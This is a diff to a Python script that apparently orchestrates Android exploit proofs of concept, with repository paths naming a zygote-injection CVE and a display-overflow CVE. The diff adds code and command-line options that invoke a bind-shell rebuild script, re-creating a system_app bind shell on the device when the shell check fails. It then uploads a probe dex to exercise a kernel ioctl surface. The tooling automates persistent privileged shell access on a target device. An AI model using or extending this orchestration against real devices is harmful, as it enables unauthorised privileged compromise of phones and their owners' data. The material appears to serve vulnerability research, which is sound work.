@@ -17,6 +17,9 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parents[2]
 APUSYS_JAVA = ROOT / "13-apusys-ioctl-surface" / "poc" / "ApusysIoctlProbe.java"
 DRM_TRIGGER_JAVA = ROOT / "07-cve-2023-32836-display-overflow" / "poc" / "DrmTrigger.java"
+REBUILD_BIND_SHELL = (
+    ROOT / "06-cve-2024-31317-zygote-injection" / "poc" / "rebuild_bind_shell.py"
+)
 DEFAULT_REMOTE_DEX = "/data/data/com.android.settings/cache/apusys_ioctl_probe.dex"
 DEFAULT_RESULT_DIR = ROOT / "poc-run-results" / "2026-06-14-batch"
 
@@ -153,6 +156,34 @@ def require_system_app(port):
     return out
 
 
+def rebuild_system_app_shell(args):
+    if not args.serial:
+        raise RuntimeError("--rebuild-shell requires -s/--serial or ANDROID_SERIAL")
+    cmd = [
+        sys.executable,
+        str(REBUILD_BIND_SHELL),
+        "-s",
+        args.serial,
+        "-p",
+        str(args.bind_port),
+        "--local-port",
+        str(args.local_port),
+        "--helper-ports",
+        args.rebuild_helper_ports,
+        "--retries",
+        str(args.rebuild_retries),
+    ]
+    if args.skip_rebuild_clean:
+        cmd.append("--skip-clean")
+    proc = run(cmd, timeout=args.rebuild_timeout, check=False)
+    if proc.stdout:
+        print(proc.stdout.rstrip())
+    if proc.stderr:
+        print(proc.stderr.rstrip(), file=sys.stderr)
+    if proc.returncode != 0:
+        raise RuntimeError(f"system_app bind shell rebuild failed: {proc.returncode}")
+
+
 def upload_dex(port, dex, remote_path, expected_md5, chunk_size):
     remote_q = shlex.quote(remote_path)
     b64_path = f"{remote_path}.b64"
@@ -232,6 +263,18 @@ def main():
     parser.add_argument("-s", "--serial", default=os.environ.get("ANDROID_SERIAL"))
     parser.add_argument("--local-port", type=int, default=48888,
                         help="local adb-forward port for the system_app bind shell")
+    parser.add_argument("--bind-port", type=int, default=8888,
+                        help="device-side bind shell port used by rebuild_bind_shell.py")
+    parser.add_argument("--rebuild-shell", action="store_true",
+                        help="clean/rebuild the system_app bind shell before running")
+    parser.add_argument("--rebuild-if-needed", action="store_true",
+                        help="rebuild the bind shell if the local system_app check fails")
+    parser.add_argument("--rebuild-helper-ports", default="8889",
+                        help="helper device-side shell ports passed to rebuild_bind_shell.py")
+    parser.add_argument("--rebuild-retries", type=int, default=3)
+    parser.add_argument("--rebuild-timeout", type=int, default=240)
+    parser.add_argument("--skip-rebuild-clean", action="store_true",
+                        help="pass --skip-clean to rebuild_bind_shell.py")
     parser.add_argument("--android-jar")
     parser.add_argument("--mode", default="--run-cmd-vpu-guard")
     parser.add_argument("--remote-dex", default=DEFAULT_REMOTE_DEX)
@@ -252,8 +295,19 @@ def main():
     dex_dir = Path(args.dex_dir)
     result_dir = Path(args.result_dir)
 
+    if args.rebuild_shell:
+        print("[*] Rebuilding system_app bind shell")
+        rebuild_system_app_shell(args)
+
     print(f"[*] Checking system_app shell on 127.0.0.1:{args.local_port}")
-    context = require_system_app(args.local_port)
+    try:
+        context = require_system_app(args.local_port)
+    except RuntimeError:
+        if not args.rebuild_if_needed:
+            raise
+        print("[*] system_app shell check failed; rebuilding bind shell")
+        rebuild_system_app_shell(args)
+        context = require_system_app(args.local_port)
     print(context)
 
     if args.skip_build:
